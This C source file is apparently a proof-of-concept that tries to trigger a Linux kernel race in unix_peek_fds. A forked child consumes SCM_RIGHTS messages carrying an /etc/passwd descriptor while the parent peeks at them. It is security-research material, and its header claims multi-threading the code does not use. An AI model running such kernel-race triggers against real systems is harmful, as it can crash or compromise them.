/*
 * PoC for WMI-3: unix_peek_fds
 * Multi-threaded: one thread peeks while another reads (consumes).
 * This might create a race between unix_peek_fds (duplication)
 * and unix_detach_fds (moving/clearing).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>

volatile int stop = 0;

int main(int argc, char *argv[])
{
    int sv[2];
    int fd_to_send;
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;
    pid_t pid;

    /* Create a socket pair (DGRAM - no iolock needed for separate sockets? 
     * Actually DGRAM also uses iolock... */
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    fd_to_send = open("/etc/passwd", O_RDONLY);
    if (fd_to_send < 0) {
        perror("open");
        return 1;
    }

    /* Send 200 messages with SCM_RIGHTS */
    for (i = 0; i < 200; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(buf, 0x41 + (i % 26), sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_name = NULL;
        msg.msg_namelen = 0;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        *(int *)CMSG_DATA(cmsg) = fd_to_send;

        ret = sendmsg(sv[0], &msg, 0);
        if (ret < 0) {
            perror("sendmsg");
            return 1;
        }
    }
    printf("Sent 200 messages with SCM_RIGHTS\n");

    /* Fork: parent peeks, child consumes */
    pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        /* Child: consume messages */
        for (i = 0; i < 200; i++) {
            memset(&msg, 0, sizeof(msg));
            memset(cmsg_buf, 0, sizeof(cmsg_buf));
            iov.iov_base = buf;
            iov.iov_len = sizeof(buf);
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1;
            msg.msg_control = cmsg_buf;
            msg.msg_controllen = sizeof(cmsg_buf);

            ret = recvmsg(sv[1], &msg, 0);
            if (ret < 0) {
                perror("child recvmsg");
                exit(1);
            }
        }
        exit(0);
    }

    /* Parent: peek rapidly */
    for (i = 0; i < 500; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK | MSG_DONTWAIT);
        if (ret < 0 && errno != EAGAIN) {
            perror("parent recvmsg (peek)");
            break;
        }
    }
    printf("Parent did %d peeks\n", i);

    wait(NULL);

    close(fd_to_send);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed\n");
    return 0;
}
